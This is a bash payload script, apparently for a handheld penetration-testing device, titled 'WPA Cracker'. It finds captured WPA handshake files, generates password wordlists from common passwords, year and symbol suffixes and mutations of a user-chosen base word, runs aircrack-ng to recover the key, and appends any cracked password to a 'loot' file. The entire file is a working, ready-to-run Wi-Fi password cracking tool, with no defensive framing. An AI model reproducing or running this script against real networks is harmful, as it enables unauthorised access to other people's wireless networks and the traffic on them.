#!/bin/bash
# Title: WPA Cracker
# Author: bad-antics
# Description: Onboard wordlist attack on captured handshakes
# Category: nullsec/crack

LOOT_DIR="/mmc/nullsec/handshakes"
mkdir -p "$LOOT_DIR"

PROMPT "WPA CRACKER

Crack WPA handshakes
using onboard wordlists.

Includes common passwords
and pattern generators.

Press OK to continue."

# Find .cap files
mapfile -t CAP_ARRAY < <(find /mmc/nullsec -name "*.cap" -type f 2>/dev/null | head -10)
CAP_COUNT=${#CAP_ARRAY[@]}

if [ "$CAP_COUNT" -eq 0 ]; then
    ERROR_DIALOG "No handshakes found!

Capture first with:
HandshakeHunter, AutoPwn,
or Reaper payloads."
    exit 1
fi

# Build file list for display
FILE_LIST=""
for i in $(seq 0 $((CAP_COUNT - 1))); do
    FILE_LIST="${FILE_LIST}$((i+1)). $(basename "${CAP_ARRAY[$i]}")\n"
done

PROMPT "CAPTURES: $CAP_COUNT

$(echo -e "$FILE_LIST")
Select file to crack."

FILE_NUM=$(NUMBER_PICKER "File # (1-$CAP_COUNT):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 0 ;; esac
[ "$FILE_NUM" -lt 1 ] && FILE_NUM=1
[ "$FILE_NUM" -gt "$CAP_COUNT" ] && FILE_NUM=$CAP_COUNT
TARGET_FILE="${CAP_ARRAY[$((FILE_NUM - 1))]}"

# Verify it has a handshake
if ! aircrack-ng "$TARGET_FILE" 2>/dev/null | grep -q "1 handshake"; then
    resp=$(CONFIRMATION_DIALOG "No handshake in file!

Try cracking anyway?
(May not succeed)")
    [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0
fi

PROMPT "WORDLIST:

1. Common passwords (fast)
2. Extended wordlist
3. Pattern attack
4. Custom wordlist path

Select on next screen."

WORDLIST_MODE=$(NUMBER_PICKER "Mode (1-4):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) WORDLIST_MODE=1 ;; esac

WORDLIST=""
case $WORDLIST_MODE in
    1)
        WORDLIST="/tmp/wpa_common.txt"
        # WPA passwords must be 8+ chars
        cat > "$WORDLIST" << 'COMMONWORDS'
password
12345678
password1
123456789
qwerty123
password123
1234567890
letmein123
welcome123
admin1234
monkey123
dragon123
master123
login1234
princess1
sunshine1
iloveyou1
trustno1!
00000000
football1
shadow123
superman1
michael123
ninja1234
mustang123
password12
password01
qwertyuiop
1q2w3e4r5t
admin12345
welcome1234
changeme123
COMMONWORDS
        ;;
    2)
        WORDLIST="/tmp/wpa_extended.txt"
        > "$WORDLIST"
        for year in 2020 2021 2022 2023 2024 2025; do
            echo "password$year" >> "$WORDLIST"
            echo "${year}${year}" >> "$WORDLIST"
        done
        for word in love life home work wifi network admin guest hello world; do
            echo "${word}1234" >> "$WORDLIST"
            echo "${word}12345" >> "$WORDLIST"
            echo "${word}!234" >> "$WORDLIST"
        done
        for base in password qwerty letmein welcome; do
            for suf in 1 12 123 1234 12345 "!" "@" "#"; do
                combo="${base}${suf}"
                [ ${#combo} -ge 8 ] && echo "$combo" >> "$WORDLIST"
            done
        done
        ;;
    3)
        PROMPT "PATTERN ATTACK:

Enter base word for
password variations.

Example: company name,
pet name, city, etc."

        BASE_WORD=$(TEXT_PICKER "Base word:" "password")
        case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) BASE_WORD="password" ;; esac
        WORDLIST="/tmp/wpa_pattern.txt"
        > "$WORDLIST"
        for suf in "" 1 12 123 1234 12345 "!" "@" "#" "!!" "123!" "1234!"; do
            combo="${BASE_WORD}${suf}"
            [ ${#combo} -ge 8 ] && echo "$combo" >> "$WORDLIST"
        done
        for year in 2020 2021 2022 2023 2024 2025; do
            combo="${BASE_WORD}${year}"
            [ ${#combo} -ge 8 ] && echo "$combo" >> "$WORDLIST"
        done
        # Capitalized variants
        UPPER_FIRST="${BASE_WORD^}"
        ALL_UPPER="${BASE_WORD^^}"
        for w in "$UPPER_FIRST" "$ALL_UPPER"; do
            for suf in "" 1 123 1234 "!" "123!"; do
                combo="${w}${suf}"
                [ ${#combo} -ge 8 ] && echo "$combo" >> "$WORDLIST"
            done
        done
        ;;
    4)
        WORDLIST=$(TEXT_PICKER "Wordlist path:" "/mmc/wordlists/rockyou.txt")
        case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 0 ;; esac
        [ ! -f "$WORDLIST" ] && { ERROR_DIALOG "Wordlist not found:\n$WORDLIST"; exit 1; }
        ;;
esac

WORD_COUNT=$(wc -l < "$WORDLIST" 2>/dev/null || echo 0)

resp=$(CONFIRMATION_DIALOG "START CRACKING?

File: $(basename "$TARGET_FILE")
Words: $WORD_COUNT

Press OK to begin.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Cracking with $WORD_COUNT words..."
SPINNER_START "Cracking..."

RESULT=$(aircrack-ng -w "$WORDLIST" "$TARGET_FILE" 2>/dev/null)

SPINNER_STOP

# Cleanup temp wordlists
rm -f /tmp/wpa_common.txt /tmp/wpa_extended.txt /tmp/wpa_pattern.txt

if echo "$RESULT" | grep -q "KEY FOUND"; then
    KEY=$(echo "$RESULT" | grep "KEY FOUND" | sed 's/.*\[ \(.*\) \].*/\1/')

    echo "$(date) | $(basename "$TARGET_FILE") | $KEY" >> "$LOOT_DIR/cracked.txt"

    PROMPT "PASSWORD FOUND!

$KEY

Saved to cracked.txt

Press OK to exit."
else
    PROMPT "NO MATCH FOUND

Password not in wordlist.

Try:
- Different wordlist
- Pattern attack
- Larger wordlist file

Press OK to exit."
fi
